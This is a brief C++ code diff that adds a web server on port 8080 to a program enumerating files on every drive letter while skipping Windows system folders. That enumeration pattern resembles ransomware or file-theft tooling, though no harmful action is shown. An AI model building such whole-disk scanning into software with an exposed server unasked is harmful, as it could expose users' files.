@@ -4,6 +4,7 @@
 #include <functional>
 #include <dirent.h>
 #include <cstdio>
+#include "MyServer.cpp"
 
 using namespace std;
 const string dir_ignore = "AppData Program Program Files x86 Windows";
@@ -35,6 +36,7 @@ void listFiles(const string &path, function<void(const std::string &)> cb) {
 const char* drive[13] = { "A:\\", "B:\\", "C:\\", "D:\\", "E:\\", "F:\\", "G:\\", "H:\\", "I:\\", "J:\\",  "K:\\", "L:\\" };
 
 int main() {
+    webserver(8080, Request_Handler);
     UINT drives_num;
     int i;
     // loop through fixed drives
